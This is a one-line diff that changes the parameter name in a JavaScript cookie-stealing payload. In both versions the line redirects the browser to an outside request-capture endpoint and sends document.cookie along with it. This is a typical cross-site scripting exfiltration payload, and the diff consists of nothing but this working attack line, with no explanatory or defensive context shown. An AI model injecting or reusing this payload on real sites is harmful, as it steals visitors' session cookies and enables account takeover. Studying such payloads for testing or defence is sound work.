@@ -1,1 +1,1 @@
-document.location="https://zfefergrh.free.beeceptor.com/?c="+document.cookie;
+document.location="https://zfefergrh.free.beeceptor.com/?a="+document.cookie;
